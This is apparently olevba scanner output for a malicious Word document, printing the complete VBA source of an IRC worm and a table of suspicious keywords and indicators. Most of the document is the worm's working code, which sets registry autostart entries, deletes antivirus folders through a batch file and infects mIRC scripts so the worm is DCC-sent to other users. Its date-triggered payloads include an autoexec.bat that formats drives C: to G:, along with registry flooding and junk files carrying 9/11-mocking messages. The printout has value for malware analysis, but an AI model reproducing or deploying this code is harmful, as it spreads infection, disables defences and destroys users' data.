olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./IRC-Worm.MSWord.WMVG
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./IRC-Worm.MSWord.WMVG - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: ./IRC-Worm.MSWord.WMVG - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Win32.BeanLaden.worm by Kernel32

Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Const virname = "w32.BeanLadean.worm"
Private Sub Main()
On Error Resume Next
Randomize Timer
Dim txt(100) As String
Dim plce(100) As String
Dim ANTVIR(100) As String
Form1.Visible = 0
Form1.Enabled = 0
Form1.Caption = virname
Set wsh = CreateObject("Wscript.Shell")
Rem -ADDAUTOSTART2REG-
wsh.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\run32dll", ExePlace
wsh.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce\run32dll", ExePlace
wsh.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\" & virname, junk
wsh.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\" & virname, junk
wsh.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\" & virname, junk
wsh.regwrite "HKEY_LOCAL_MACHINE\Software\" & virname, junk
wsh.regwrite "HKEY_LOCAL_MACHINE\" & virname, junk
Rem -DECLARATIONS-
ExePlace = VBA.Environ("windir") & "\system\run32dll.exe"
plce(1) = "c:\mirc\system\script.ini"
plce(2) = "c:\mirc32\system\script.ini"
plce(3) = "c:\mirc\script.ini"
plce(4) = "c:\mirc32\script.ini"
plce(5) = "c:\progra~1\mirc32\system\script.ini"
plce(6) = "c:\progra~1\mirc\system\script.ini"
plce(7) = "c:\progra~1\mirc\script.ini"
plce(8) = "c:\progra~1\mirc32\script.ini"
txt(0) = "n0=[SCRIPT]" & junk
txt(1) = "n1=" & junk
txt(2) = "n2=;" & virname & junk
txt(3) = "n3=" & junk
txt(4) = "n4=ON 1:JOIN:#: { /if ( $nick == $me ) {halt}" & junk
txt(5) = "n5=" & junk
txt(6) = "n6=/dcc send $nick " & ExePlace & junk
txt(7) = "n7=" & junk
txt(8) = "n8=ON 1:PART:#: { /if ( $nick == $me ) {halt} " & junk
txt(9) = "n9=" & junk
txt(10) = "n10=/dcc send $nick " & ExePlace & junk
txt(11) = "n11=" & junk
txt(12) = "n12=ON 1:TEXT:*Ladean* { /if ( $nick == $me ) {halt} " & junk
txt(13) = "n13=" & junk
txt(14) = "n14=/dcc send $nick " & ExePlace & junk
txt(15) = "n15=" & junk
txt(16) = "n16=ON 1:TEXT:*usama*:#:{ /if ( $nick == $me ) { halt } " & junk
txt(17) = "n17=" & junk
txt(18) = "n18=/dcc send $nick " & ExePlace & junk
txt(19) = "n19=" & junk
ANTVIR(1) = "c:\progra~1\mcafee"
ANTVIR(2) = "c:\progra~1\networ~1"
ANTVIR(3) = "c:\progra~1\scan32"
ANTVIR(4) = "c:\progra~1\scan"
ANTVIR(5) = "c:\mcafee"
ANTVIR(6) = "c:\networ~1"
ANTVIR(7) = "c:\scan32"
ANTVIR(8) = "c:\scan"
ANTVIR(9) = "c:\progra~1\datafe~1"
ANTVIR(10) = "c:\progra~1\f-secure"
ANTVIR(11) = "c:\progra~1\fsecure"
ANTVIR(12) = "c:\fsecure"
ANTVIR(13) = "c:\f-secure"
ANTVIR(14) = "c:\datafe~1"
ANTVIR(15) = "c:\progra~1\fprot"
ANTVIR(16) = "c:\progra~1\f-prot"
ANTVIR(17) = "c:\fprot"
ANTVIR(18) = "c:\f-prot"
ANTVIR(19) = "c:\progra~1\avp32"
ANTVIR(20) = "c:\progra~1\antivi~1"
ANTVIR(21) = "c:\progra~1\avp"
ANTVIR(22) = "c:\avp32"
ANTVIR(23) = "c:\antivi~1"
ANTVIR(24) = "c:\avp30"
ANTVIR(25) = "c:\avp*"
ANTVIR(26) = "c:\pccillin"
ANTVIR(27) = "c:\trendp~1"
ANTVIR(28) = "c:\progra~1\pccillin"
ANTVIR(29) = "c:\progra~1\trendp~1"
ANTVIR(30) = "c:\progra~1\quickh~1"
ANTVIR(31) = "c:\progra~1\norman~1"
ANTVIR(32) = "c:\progra~1\norman"
ANTVIR(33) = "c:\norman"
ANTVIR(34) = "c:\progra~1\drsolom~1"
ANTVIR(35) = "c:\progra~1\toolkit"
ANTVIR(36) = "c:\toolkit"
ANTVIR(36) = "c:\drsolom~1"
ANTVIR(37) = "c:\progra~1\norton*"
ANTVIR(38) = "c:\norton*"
ANTVIR(39) = "c:\progra~1\drweb*"
ANTVIR(40) = "c:\progra~1\fsav32"
ANTVIR(41) = "c:\progra~1\fsav"
ANTVIR(42) = "c:\fsav32"
ANTVIR(43) = "c:\fsav"
today = Day(Now())
Rem -RETRO-
Open VBA.Environ("WINDIR") & "\WINSTART.BAT" For Output As #1
Print #1, "@Ctty nul"
For i = 1 To 40
Print #1, "@Break off "
Print #1, "@echo off "
Print #1, "rem " & junk
Print #1, "@deltree /y " & ANTVIR(i)
Print #1, "rem " & junk
Next
Print #1, "@Ctty con"
Print #1, "@del " & VBA.Environ("windir") & "\winstart.bat"
Print #1, "rem " & junk

Close #1
Rem -MAKECOPIESOFMYSELF-
VBA.FileCopy App.Path & "\" & App.EXEName & ".exe", ExePlace
Rem -SPREAD2MIRC-
For r = 1 To 8
SetAttr plce(r), vbNormal
Open plce(r) For Output As #1
    For i = 1 To 19
        Print #1, txt(i)
    Next
Close #1
Next
Rem -Payload-
If Day(Now()) = 11 And Month(Now()) = 11 Then
Open "c:\autoexec.bat" For Output As #1
Print #1, "@echo " & virname
Print #1, "@rem " & junk
Print #1, "@echo The face of the future"
Print #1, "@rem " & junk
Print #1, "@ctty nul"
Print #1, "@rem " & junk
Print #1, "@echo Y|format g: /q"
Print #1, "@rem " & junk
Print #1, "@echo Y|format f: /q"
Print #1, "@rem " & junk
Print #1, "@echo Y|format e: /q"
Print #1, "@rem " & junk
Print #1, "@echo Y|format d: /q"
Print #1, "@rem " & junk
Print #1, "@echo Y|format c: /q"
Print #1, "@rem " & junk
Print #1, "@ctty con"
Print #1, "@rem " & junk
Close #1
End If
Select Case today
Case 5
    Open "c:\windows\BeanLadean.ocx" For Output As #1
    Print #1, virname
    Print #1, "All Bean Ladean Shares must be for sale at 11 September"
    BeanLanden
Case 10
    Open "c:\windows\BeanLadean.drv" For Output As #1
    Print #1, virname
    Print #1, "A Bean Ladean a day keeps the Shares away"
    BeanLanden
Case 11
    Do
    mciSendString "set cd door open", 0, 0, 0
    mciSendString "set cd door closed", 0, 0, 0
    mciSendString "set cd time format tmsf wait", 0, 0, 0
    mciSendString "open cdaudio alias cd wait shareable", 0, 0, 0
    Loop
Case 15
    Open "c:\windows\BeanLadean.ole" For Output As #1
    Print #1, virname
    Print #1, "Bean Ladean Shares for Sale at www.ubl.com"
    BeanLanden
Case 20
    Open "c:\windows\BeanLadean.sys" For Output As #1
    Print #1, virname
    Print #1, "Bean Ladean Shares for Sale at $911 a share"
    BeanLanden
Case 25
    Open "c:\windows\BeanLadean.vxd" For Output As #1
    Print #1, virname
    Print #1, "The new trade center: BLTC (Bean Ladean Trade Center)"
    BeanLanden
Case 30
    Open "c:\windows\BeanLadean.dll" For Output As #1
    Print #1, virname
    Print #1, "Bean Ladean gets payed today!"
    BeanLanden
Case 31
    For i = 1 To 10 + Int(Rnd * 10)
        wsh.regwrite "HKEY_LOCAL_MACHINE\" & junk, junk
    Next
    For i = 1 To 10 + Int(Rnd * 10)
        wsh.regwrite "HKEY_CLASSES_ROOT\" & junk, junk
    Next
    For i = 1 To 10 + Int(Rnd * 10)
        wsh.regwrite "HKEY_CURRENT_USER\" & junk, junk
    Next
    For i = 1 To 10 + Int(Rnd * 10)
        wsh.regwrite "HKEY_USERS\" & junk, junk
    Next
    End Select
Rem -EXIT-
Unload Me
End Sub

Private Function junk()
num1 = (Int(Rnd * 30) + 31)
num2 = (Int(Rnd * 30) + 31)
For i = 1 To 30 + num1 + num2
g = g & Chr(Int(Rnd * (24) + 65)) & Int(Rnd * 10)
Next
junk = ";" & g
End Function

Private Sub BeanLanden()
Print #1, ""
Print #1, ""
For i = 1 To Int(Rnd * 150) + Day(Now())
Print #1, junk & junk & junk
Next
Close #1
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Wscript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |winmm.dll           |Executable file name                         |
|IOC       |run32dll.exe        |Executable file name                         |
|IOC       |WINSTART.BAT        |Executable file name                         |
|IOC       |winstart.bat        |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |BeanLadean.dll      |Executable file name                         |
+----------+--------------------+---------------------------------------------+

